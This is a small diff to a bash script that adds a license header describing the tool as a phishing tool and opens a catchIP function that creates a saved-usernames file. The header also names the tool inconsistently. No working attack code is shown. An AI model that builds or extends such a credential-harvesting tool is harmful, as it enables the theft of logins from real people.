@@ -1,5 +1,15 @@
 #!/bin/bash
 
+# Tool Name: Aciwoo
+# Tool URI: https://github.com/SullFurix/Aciwoo/
+# Description: Phishim is a phishing tool.
+# Version: 4.0.0
+# Author: SullFurix
+# Author URI: http://sullfurix.rf.gd
+# Copyright: © 2020 SullFurix.
+# License: GNU General Public License v3.0
+# License URI: http://www.gnu.org/licenses/gpl-3.0.html
+
 catchIP() {
 
   touch web/$server/saved.usernames.txt
